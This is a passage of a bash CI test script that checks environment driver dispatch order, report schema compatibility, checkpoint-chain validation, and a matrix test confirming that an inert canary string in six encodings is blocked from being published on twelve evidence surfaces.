run_direct_core_case >"$scratch/direct-absol.out" 2>"$scratch/direct-absol.err" || {
  sed -n '1,240p' "$scratch/direct-absol.err" >&2
  fail 'the real Absol driver_core unit dispatch failed'
}
assert_direct_success absol
expected_direct_events=$'preflight absol\nclosure verify\n'
expected_direct_events+="pls closure import oci://ghcr.io/atomicloud/example/closure/$SOURCE_SHA"$'\n'
expected_direct_events+=$'pls closure preflight --denied-network\nclosure exact-set\n'
expected_direct_events+="pls env up --profile absol --build-mode build-local --artifact $ARTIFACT_DIGEST"$'\n'
expected_direct_events+=$'pls env doctor --profile absol --json\n'
expected_direct_events+=$'journey absol setup\njourney absol probe\njourney absol cleanup\n'
expected_direct_events+='pls env down --profile absol'
assert_direct_events absol "$expected_direct_events"

prepare_direct_driver_case 7204 fleet-independence
run_direct_core_case >"$scratch/direct-fleet.out" 2>"$scratch/direct-fleet.err" || {
  sed -n '1,240p' "$scratch/direct-fleet.err" >&2
  fail 'the real fleet-independence driver_core unit dispatch failed'
}
assert_direct_success fleet-independence
if ! jq -e '
  .coverage == [{id:"fleet-endpoint-resource-negative-probe",outcome:"Unavailable",
    reasonCode:"FleetEndpointResourceNegativeProbeContractUnavailable",required:false}] and
  (.journeys | length) == 1 and
  (.journeys[0] as $journey |
    ($journey | keys | sort) ==
      ["durationSeconds","fixturePackDigest","id","outcome","reasonCode","required"] and
    $journey.id == "fleet-demo" and $journey.outcome == "Pass" and
    $journey.reasonCode == "AssertionsSatisfied" and $journey.required == true and
    ($journey.durationSeconds | type == "number" and . >= 0) and
    ($journey.fixturePackDigest | test("^sha256:[0-9a-f]{64}$")))
' "$DIRECT_STATE/final-core-report.json" >/dev/null; then
  sed -n '1,240p' "$DIRECT_STATE/final-core-report.json" >&2
  fail 'fleet direct unit dispatch claimed production proof or lost the explicit Unavailable row'
fi
expected_direct_events=$'preflight fleet-independence\n'
expected_direct_events+="pls env up --profile ditto --build-mode build-local --artifact $ARTIFACT_DIGEST"$'\n'
expected_direct_events+=$'pls env doctor --profile ditto --json\n'
expected_direct_events+=$'journey fleet-independence setup\njourney fleet-independence probe\n'
expected_direct_events+=$'fleet-negative-observed bootstrap-fleet-independence-v1 diene-fleet-controller diene-fleet-agent\n'
expected_direct_events+=$'journey fleet-independence cleanup\n'
expected_direct_events+='pls env down --profile ditto'
assert_direct_events fleet-independence "$expected_direct_events"

prepare_direct_driver_case 7205 ditto-vendor
assert_direct_vendor_main_no_return_trap ||
  fail 'sourced environment_vendor_main leaked a RETURN cleanup trap'
run_direct_vendor_case >"$scratch/direct-vendor.out" 2>"$scratch/direct-vendor.err" || {
  sed -n '1,240p' "$scratch/direct-vendor.err" >&2
  fail 'the real vendor_driver_core unit dispatch failed'
}
assert_direct_success ditto-vendor vendor
expected_direct_events=$'preflight ditto-vendor\n'
expected_direct_events+="pls env up --profile ditto --build-mode build-local --artifact $ARTIFACT_DIGEST"$'\n'
expected_direct_events+=$'pls env doctor --profile ditto --json\nbroker issue\n'
expected_direct_events+=$'journey ditto-vendor setup\njourney ditto-vendor probe\n'
expected_direct_events+=$'journey ditto-vendor cleanup\njourney ditto-vendor absence\nbroker revoke true\n'
expected_direct_events+='pls env down --profile ditto'
assert_direct_events ditto-vendor "$expected_direct_events"
ok 'real sourced drivers dispatch build-local, five pull proofs, Absol closure order, fleet observable, and vendor cleanup without product-readiness claims'

printf '== report namespaces and additive schema compatibility ==\n'

validate_report_namespace_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_validate_report_namespace "$@"
)

validate_report_namespace_case ditto-build-local "$ARTIFACT_DIGEST" ''
validate_report_namespace_case ditto-vendor '' "$ARTIFACT_DIGEST"
ok 'the exact core and vendor digest namespaces are accepted only by their owning lanes'

expect_refusal ReportNamespaceViolation validate_report_namespace_case ditto-build-local '' ''
expect_refusal ReportNamespaceViolation validate_report_namespace_case ditto-build-local \
  "$ARTIFACT_DIGEST" "$ARTIFACT_DIGEST"
expect_refusal ReportNamespaceViolation validate_report_namespace_case ditto-build-local '' "$ARTIFACT_DIGEST"
expect_refusal ReportNamespaceViolation validate_report_namespace_case ditto-vendor '' ''
expect_refusal ReportNamespaceViolation validate_report_namespace_case ditto-vendor \
  "$ARTIFACT_DIGEST" "$ARTIFACT_DIGEST"
expect_refusal ReportNamespaceViolation validate_report_namespace_case ditto-vendor "$ARTIFACT_DIGEST" ''

core_with_vendor=$scratch/core-with-vendor.json
vendor_with_core=$scratch/vendor-with-core.json
jq '.vendorOutcome = {id:"foreign",outcome:"Pass",reasonCode:"Foreign",required:false,durationSeconds:0}' \
  "$happy_core_report" >"$core_with_vendor"
jq '.journeys = []' "$happy_vendor_report" >"$vendor_with_core"
expect_refusal ReportNamespaceViolation "$work/scripts/ci/environment-report.sh" \
  --kind core --input "$happy_vendor_report" --output "$scratch/vendor-as-core.json"
expect_refusal ReportNamespaceViolation "$work/scripts/ci/environment-report.sh" \
  --kind vendor --input "$happy_core_report" --output "$scratch/core-as-vendor.json"
expect_refusal ReportNamespaceViolation "$work/scripts/ci/environment-report.sh" \
  --kind core --input "$core_with_vendor" --output "$scratch/core-cross-field.json"
expect_refusal ReportNamespaceViolation "$work/scripts/ci/environment-report.sh" \
  --kind vendor --input "$vendor_with_core" --output "$scratch/vendor-cross-field.json"

legacy_core=$scratch/legacy-core-report.json
legacy_vendor=$scratch/legacy-vendor-report.json
legacy_runtime=$scratch/legacy-garden-runtime.json
jq '
  del(.namespaceLifecycle,.checkpointChain,
      .instance.clusterId,.instance.osId,.instance.osVersion,.instance.k3sVersion,
      .instance.kubernetesVersion,.instance.nodeCount,.instance.capacity,
      .tooling.nscVersion,.tooling.nscArtifactDigest,.tooling.nscBinaryDigest,
      .tooling.sourceArchiveDigest,.tooling.artifactSubjectDigest,
      .evidence.proofBundle,
      .evidence.egressCanary.profileId,.evidence.egressCanary.enforcement,
      .evidence.egressCanary.platformStatus,.evidence.egressCanary.hostileProbes,
      .timings.createToKubernetesReadySeconds,.timings.driverTransferSetupSeconds,
      .timings.renderApplySeconds,.timings.collectionSeconds,.timings.destroySeconds,
      .timings.totalColdSeconds)
' "$happy_core_report" >"$legacy_core"
jq '
  del(.namespaceLifecycle,.checkpointChain,
      .instance.clusterId,.instance.osId,.instance.osVersion,.instance.k3sVersion,
      .instance.kubernetesVersion,.instance.nodeCount,.instance.capacity,
      .tooling.nscVersion,.tooling.nscArtifactDigest,.tooling.nscBinaryDigest,
      .tooling.sourceArchiveDigest,.tooling.artifactSubjectDigest,
      .evidence.proofBundle,
      .evidence.egressCanary.profileId,.evidence.egressCanary.enforcement,
      .evidence.egressCanary.platformStatus,.evidence.egressCanary.hostileProbes,
      .timings.createToKubernetesReadySeconds,.timings.driverTransferSetupSeconds,
      .timings.renderApplySeconds,.timings.collectionSeconds,.timings.destroySeconds,
      .timings.totalColdSeconds) |
  .credential.issuer = "host-owned-broker"
' "$happy_vendor_report" >"$legacy_vendor"
jq -n --arg digest "$ARTIFACT_DIGEST" '
  {apiVersion:"diene-runtime/v1",profile:"ditto",buildMode:"build-local",
   owner:{repositoryId:"12345",repositoryKey:"AtomiCloud/example",
     allocationKey:"legacy-allocation",generationKey:"legacy-generation",gardenOwnedField:"retained"},
   substrate:{kind:"k3d",name:"opaque-compatibility-name",receipt:"legacy-receipt",
     kubeconfig:"/run/legacy/kubeconfig",context:"legacy-context",gardenOwnedField:true},
   artifact:{digest:$digest,gardenOwnedField:"retained"},gardenOwnedTopLevel:{retained:true}}
' >"$legacy_runtime"

validator=${DIENE_SCHEMA_VALIDATOR_BIN:-check-jsonschema}
schema_dir=$work/schemas/ci
"$validator" --base-uri "file://$schema_dir/" \
  --schemafile "$schema_dir/diene-environment-report-v1.schema.json" "$legacy_core" >/dev/null ||
  fail 'the additive Namespace schema rejected a previously valid core report'
"$validator" --base-uri "file://$schema_dir/" \
  --schemafile "$schema_dir/diene-vendor-report-v1.schema.json" "$legacy_vendor" >/dev/null ||
  fail 'the additive Namespace schema rejected a previously valid vendor report'
"$validator" --base-uri "file://$schema_dir/" \
  --schemafile "$schema_dir/diene-runtime-consumption-v1.schema.json" "$legacy_runtime" >/dev/null ||
  fail 'the Garden consumption view required CI-owned Namespace fields'
ok 'legacy core/vendor reports and the Garden-owned runtime view remain backward compatible'

cached_report_case=$scratch/cached-ditto-report
cached_report_input=$cached_report_case/input.json
cached_report_output=$cached_report_case/output.json
install -d -m 0700 "$cached_report_case/staging" "$cached_report_case/proof" \
  "$cached_report_case/runner"
for required_surface in stdout stderr argv environ; do
  : >"$cached_report_case/staging/$required_surface"
done
: >"$cached_report_case/github-output"
: >"$cached_report_case/github-env"
: >"$cached_report_case/summary"
jq '
  .namespaceLifecycle.cacheAttached = true |
  .namespaceLifecycle.orchestratorLabel = "nscloud-ubuntu-26.04-amd64-16x32-with-cache"
' "$happy_core_report" >"$cached_report_input"
env DIENE_ORCHESTRATOR_LABEL=nscloud-ubuntu-26.04-amd64-16x32-with-cache \
  DIENE_LEAK_CANARY=cached-ditto-report-canary \
  DIENE_EVIDENCE_STAGING="$cached_report_case/staging" \
  DIENE_PROOF_BUNDLE_DIR="$cached_report_case/proof" DIENE_SCHEMA_DIR="$schema_dir" \
  RUNNER_TEMP="$cached_report_case/runner" GITHUB_OUTPUT="$cached_report_case/github-output" \
  GITHUB_ENV="$cached_report_case/github-env" GITHUB_STEP_SUMMARY="$cached_report_case/summary" \
  "$work/scripts/ci/environment-report.sh" --kind core --input "$cached_report_input" \
  --output "$cached_report_output" >"$cached_report_case/stdout" 2>"$cached_report_case/stderr" || {
  sed -n '1,160p' "$cached_report_case/stderr" >&2
  fail 'the real report finalizer rejected the cached Ditto 26.04 label'
}
jq -e '
  .namespaceLifecycle.cacheAttached == true and
  .namespaceLifecycle.orchestratorLabel ==
    "nscloud-ubuntu-26.04-amd64-16x32-with-cache" and
  .evidence.leakageScan.outcome == "Pass"
' "$cached_report_output" >/dev/null ||
  fail 'the finalized cached Ditto report lost its cache/label/leakage facts'
ok 'a cached Ditto 26.04 report passes the real closed report finalizer and schema'

printf '== every leakage encoding is suppressed on every evidence surface ==\n'

jq -e '
  .evidence.leakageScan.outcome == "Pass" and
  .evidence.leakageScan.encodings ==
    ["raw","base64","url-encoded","json-escaped","newline-normalized","kubeconfig-embedded"] and
  (.evidence.leakageScan.scannedPaths | length) >= 3
' "$happy_core_report" >/dev/null || fail 'the clean lifecycle did not record the complete leakage scan vocabulary'
ok 'a clean outer proof records all six leakage encodings and scanned surfaces'

leak_interface=$scratch/leak-interface
install -d -m 0700 "$leak_interface/staging" "$leak_interface/proof" "$leak_interface/runner"
for required_surface in stdout stderr argv environ; do : >"$leak_interface/staging/$required_surface"; done
: >"$leak_interface/github-output"
: >"$leak_interface/github-env"
: >"$leak_interface/summary"
expect_refusal EvidenceLeakDetected env -u DIENE_LEAK_CANARY \
  DIENE_EVIDENCE_STAGING="$leak_interface/staging" DIENE_PROOF_BUNDLE_DIR="$leak_interface/proof" \
  DIENE_SCHEMA_DIR="$schema_dir" RUNNER_TEMP="$leak_interface/runner" \
  GITHUB_OUTPUT="$leak_interface/github-output" GITHUB_ENV="$leak_interface/github-env" \
  GITHUB_STEP_SUMMARY="$leak_interface/summary" "$work/scripts/ci/environment-report.sh" \
  --kind core --input "$happy_core_report" --output "$leak_interface/no-canary.json"
rm -f -- "$leak_interface/staging/stderr"
expect_refusal EvidenceLeakageInterfaceUnavailable env DIENE_LEAK_CANARY=interface-canary \
  DIENE_EVIDENCE_STAGING="$leak_interface/staging" DIENE_PROOF_BUNDLE_DIR="$leak_interface/proof" \
  DIENE_SCHEMA_DIR="$schema_dir" RUNNER_TEMP="$leak_interface/runner" \
  GITHUB_OUTPUT="$leak_interface/github-output" GITHUB_ENV="$leak_interface/github-env" \
  GITHUB_STEP_SUMMARY="$leak_interface/summary" "$work/scripts/ci/environment-report.sh" \
  --kind core --input "$happy_core_report" --output "$leak_interface/missing-surface.json"

: >"$leak_interface/staging/stderr"
mkfifo "$leak_interface/proof/hostile-fifo"
printf '%s\n' stale-report-sentinel >"$leak_interface/special-surface.json"
expect_refusal EvidenceLeakageInterfaceUnavailable env DIENE_LEAK_CANARY=interface-canary \
  DIENE_EVIDENCE_STAGING="$leak_interface/staging" DIENE_PROOF_BUNDLE_DIR="$leak_interface/proof" \
  DIENE_SCHEMA_DIR="$schema_dir" RUNNER_TEMP="$leak_interface/runner" \
  GITHUB_OUTPUT="$leak_interface/github-output" GITHUB_ENV="$leak_interface/github-env" \
  GITHUB_STEP_SUMMARY="$leak_interface/summary" "$work/scripts/ci/environment-report.sh" \
  --kind core --input "$happy_core_report" --output "$leak_interface/special-surface.json"
[[ ! -e $leak_interface/special-surface.json ]] ||
  fail 'a special evidence surface left a stale report artifact'
rm -f -- "$leak_interface/proof/hostile-fifo"

printf '%s\n' unreadable >"$leak_interface/proof/unreadable"
chmod 000 "$leak_interface/proof/unreadable"
expect_refusal EvidenceLeakageInterfaceUnavailable env DIENE_LEAK_CANARY=interface-canary \
  DIENE_EVIDENCE_STAGING="$leak_interface/staging" DIENE_PROOF_BUNDLE_DIR="$leak_interface/proof" \
  DIENE_SCHEMA_DIR="$schema_dir" RUNNER_TEMP="$leak_interface/runner" \
  GITHUB_OUTPUT="$leak_interface/github-output" GITHUB_ENV="$leak_interface/github-env" \
  GITHUB_STEP_SUMMARY="$leak_interface/summary" "$work/scripts/ci/environment-report.sh" \
  --kind core --input "$happy_core_report" --output "$leak_interface/unreadable-surface.json"
chmod 0600 "$leak_interface/proof/unreadable"
rm -f -- "$leak_interface/proof/unreadable"

printf '%s\n' stale-report-sentinel >"$leak_interface/grep-error.json"
expect_refusal EvidenceLeakageInterfaceUnavailable env DIENE_LEAK_CANARY=interface-canary \
  DIENE_GREP_BIN="$fake_grep_error" DIENE_EVIDENCE_STAGING="$leak_interface/staging" \
  DIENE_PROOF_BUNDLE_DIR="$leak_interface/proof" DIENE_SCHEMA_DIR="$schema_dir" \
  RUNNER_TEMP="$leak_interface/runner" GITHUB_OUTPUT="$leak_interface/github-output" \
  GITHUB_ENV="$leak_interface/github-env" GITHUB_STEP_SUMMARY="$leak_interface/summary" \
  "$work/scripts/ci/environment-report.sh" --kind core --input "$happy_core_report" \
  --output "$leak_interface/grep-error.json"
[[ ! -e $leak_interface/grep-error.json ]] || fail 'grep status 2 left a stale report artifact'
ok 'special, unreadable, and grep-error surfaces all fail closed without an output artifact'

leak_canary=$'line one/+"?&\nline two'
leak_base64=$(printf '%s' "$leak_canary" | base64 | tr -d '\n')
leak_url=$(jq -rn --arg value "$leak_canary" '$value | @uri')
leak_json=$(jq -rn --arg value "$leak_canary" '$value | tojson | .[1:-1]')
leak_newline=$(printf '%s' "$leak_canary" | tr '\n' ' ')
leak_kubeconfig=$(printf '%s' "$leak_base64" | base64 | tr -d '\n')
leak_encoding_names=(raw base64 url-encoded json-escaped newline-normalized kubeconfig-embedded)
leak_encoding_values=("$leak_canary" "$leak_base64" "$leak_url" "$leak_json" "$leak_newline" "$leak_kubeconfig")
leak_surfaces=(argv stdout stderr environ garden-json workspace runner-temp github-env github-output summary cache candidate-artifact)
leak_cases=0
for leak_surface in "${leak_surfaces[@]}"; do
  for leak_index in "${!leak_encoding_names[@]}"; do
    leak_encoding=${leak_encoding_names[$leak_index]}
    leak_value=${leak_encoding_values[$leak_index]}
    leak_case=$scratch/leak-matrix/$leak_surface/$leak_encoding
    leak_staging=$leak_case/staging
    leak_proof=$leak_case/proof
    leak_runner=$leak_case/runner
    leak_workspace=$leak_case/workspace
    leak_cache=$leak_case/cache
    install -d -m 0700 "$leak_staging" "$leak_proof" "$leak_runner/extra" \
      "$leak_workspace" "$leak_cache"
    for required_surface in stdout stderr argv environ; do : >"$leak_staging/$required_surface"; done
    leak_output_file=$leak_case/github-output
    leak_env_file=$leak_case/github-env
    leak_summary_file=$leak_case/summary
    : >"$leak_output_file"
    : >"$leak_env_file"
    : >"$leak_summary_file"
    case $leak_surface in
      argv | stdout | stderr | environ) leak_target=$leak_staging/$leak_surface ;;
      garden-json) leak_target=$leak_proof/garden-command.json ;;
      workspace) leak_target=$leak_workspace/leak.txt ;;
      runner-temp) leak_target=$leak_runner/extra/leak.txt ;;
      github-env) leak_target=$leak_env_file ;;
      github-output) leak_target=$leak_output_file ;;
      summary) leak_target=$leak_summary_file ;;
      cache) leak_target=$leak_cache/leak.txt ;;
      candidate-artifact) leak_target=$leak_proof/candidate-artifact.tar ;;
      *) fail "unknown leakage test surface $leak_surface" ;;
    esac
    printf '%s' "$leak_value" >"$leak_target"
    if DIENE_LEAK_CANARY="$leak_canary" DIENE_EVIDENCE_STAGING="$leak_staging" \
      DIENE_PROOF_BUNDLE_DIR="$leak_proof" DIENE_SCHEMA_DIR="$schema_dir" RUNNER_TEMP="$leak_runner" \
      GITHUB_WORKSPACE="$leak_workspace" GITHUB_OUTPUT="$leak_output_file" GITHUB_ENV="$leak_env_file" \
      GITHUB_STEP_SUMMARY="$leak_summary_file" DIENE_CACHE_DIR="$leak_cache" \
      "$work/scripts/ci/environment-report.sh" --kind core --input "$happy_core_report" \
        --output "$leak_case/published.json" >"$leak_case/out" 2>"$leak_case/err"; then
      fail "$leak_encoding leakage on $leak_surface was published"
    fi
    grep -Fq EvidenceLeakDetected "$leak_case/err" || {
      sed -n '1,120p' "$leak_case/err" >&2
      fail "$leak_encoding leakage on $leak_surface lost its stable refusal"
    }
    [[ ! -e $leak_case/published.json ]] || fail "$leak_encoding leakage left a candidate report"
    leak_cases=$((leak_cases + 1))
  done
  ok "all six leakage encodings are suppressed on $leak_surface"
done
[[ $leak_cases == 72 ]] || fail 'the complete six-by-twelve leakage matrix did not execute'

printf '== archive membership consumes tar output without SIGPIPE ==\n'

require_source_members_case() (
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-lib.sh"
  diene_require_archive_members "$@"
)
for _ in {1..64}; do
  require_source_members_case "$source_archive" \
    scripts/ci/environment-k3d-run.sh \
    schemas/ci/diene-environment-report-v1.schema.json
done
if rg -n 'tar[[:space:]]+-tf[^|]*\|[[:space:]]*grep[^[:space:]]*[[:space:]]+-[^[:space:]]*q' \
  "$work/scripts/ci/environment-k3d-run.sh" >"$scratch/tar-grep-q"; then
  sed -n '1,120p' "$scratch/tar-grep-q" >&2
  fail 'a timing-sensitive tar-to-grep-q membership pipeline remains'
fi
ok '64 repeated source-archive checks consume one complete listing without SIGPIPE'
expect_refusal UntrustedSubject require_source_members_case "$source_archive" missing/driver.sh

printf '== checkpoint chains refuse broken, resumed, and retry-to-green tails ==\n'

checkpoint_validate_case() (
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-lib.sh"
  diene_checkpoint_validate "${1:?checkpoint required}"
)
checkpoint_seal_final_case() (
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-lib.sh"
  diene_checkpoint_seal "${1:?checkpoint required}" true
)

checkpoint_clean=$scratch/checkpoint-clean.json
(
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-lib.sh"
  diene_checkpoint_init "$checkpoint_clean" "$ARTIFACT_DIGEST"
  diene_checkpoint_append "$checkpoint_clean" instance-preflight Pass "$ATTESTATION_DIGEST" false
  diene_checkpoint_append "$checkpoint_clean" environment-ready Pass "$CLOSURE_DIGEST" false
  diene_checkpoint_append "$checkpoint_clean" final-clean-pass Pass "$GARDEN_DIGEST" false
  diene_checkpoint_seal "$checkpoint_clean" true
)
jq -e '.validated == true and .resumedLegs == 0 and .finalCleanPass == true and
  (.checkpoints | length) == 3 and .checkpoints[-1].id == "final-clean-pass" and
  all(.checkpoints[]; .outcome == "Pass" and .resumed == false)' "$checkpoint_clean" >/dev/null ||
  fail 'a complete clean predecessor chain did not seal'
ok 'a complete non-resumed predecessor chain seals as the final clean full pass'

checkpoint_broken=$scratch/checkpoint-broken.json
cp "$checkpoint_clean" "$checkpoint_broken"
jq '.checkpoints[1].predecessorDigest = "sha256:9999999999999999999999999999999999999999999999999999999999999999"' \
  "$checkpoint_broken" >"$checkpoint_broken.tmp"
mv "$checkpoint_broken.tmp" "$checkpoint_broken"
expect_refusal CheckpointChainInvalid checkpoint_validate_case "$checkpoint_broken"

checkpoint_resumed=$scratch/checkpoint-resumed.json
(
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-lib.sh"
  diene_checkpoint_init "$checkpoint_resumed" "$ARTIFACT_DIGEST"
  diene_checkpoint_append "$checkpoint_resumed" resumed-readiness Pass "$ATTESTATION_DIGEST" true
  diene_checkpoint_append "$checkpoint_resumed" final-clean-pass Pass "$GARDEN_DIGEST" false
  diene_checkpoint_seal "$checkpoint_resumed" false
)
expect_refusal FinalCleanPassRequired checkpoint_seal_final_case "$checkpoint_resumed"

checkpoint_failed=$scratch/checkpoint-failed.json
(
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-lib.sh"
  diene_checkpoint_init "$checkpoint_failed" "$ARTIFACT_DIGEST"
  diene_checkpoint_append "$checkpoint_failed" failed-journey Fail "$ATTESTATION_DIGEST" false
  diene_checkpoint_append "$checkpoint_failed" final-clean-pass Pass "$GARDEN_DIGEST" false
  diene_checkpoint_seal "$checkpoint_failed" false
)
expect_refusal FinalCleanPassRequired checkpoint_seal_final_case "$checkpoint_failed"

checkpoint_no_final=$scratch/checkpoint-no-final.json
(
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-lib.sh"
  diene_checkpoint_init "$checkpoint_no_final" "$ARTIFACT_DIGEST"
  diene_checkpoint_append "$checkpoint_no_final" environment-ready Pass "$GARDEN_DIGEST" false
  diene_checkpoint_seal "$checkpoint_no_final" false
)
expect_refusal FinalCleanPassRequired checkpoint_seal_final_case "$checkpoint_no_final"

for forged_kind in resumed failed; do
  forged_report=$scratch/forged-$forged_kind-report.json
  if [[ $forged_kind == resumed ]]; then
    jq '.checkpointChain.checkpoints[0].resumed = true' "$happy_core_report" >"$forged_report"
  else
    jq '.checkpointChain.checkpoints[0].outcome = "Fail"' "$happy_core_report" >"$forged_report"
  fi
  if "$validator" --base-uri "file://$schema_dir/" \
    --schemafile "$schema_dir/diene-environment-report-v1.schema.json" "$forged_report" >/dev/null 2>&1; then
    fail "a green Namespace report forged a $forged_kind checkpoint behind clean summary booleans"
  fi
done
ok 'green report schemas reject resumed or failed checkpoint entries behind forged clean summaries'

expect_lifecycle_failure 7201 checkpoint-broken CheckpointChainInvalid
! find "$FAILURE_NSC_ROOT/instances" -name live -print -quit | grep -q . ||
  fail 'broken predecessor evidence left its exact Namespace instance live'
expect_lifecycle_failure 7202 checkpoint-resumed FinalCleanPassRequired
! find "$FAILURE_NSC_ROOT/instances" -name live -print -quit | grep -q . ||
  fail 'resumed checkpoint evidence left its exact Namespace instance live'
expect_lifecycle_failure 7203 checkpoint-no-final FinalCleanPassRequired
! find "$FAILURE_NSC_ROOT/instances" -name live -print -quit | grep -q . ||
  fail 'missing final-clean evidence left its exact Namespace instance live'
ok 'broken, resumed, and incomplete checkpoint archives stay red after exact destroy and absence proof'

printf '\nenvironment contract checkpoint: PASS (%d checks)\n' "$passed"
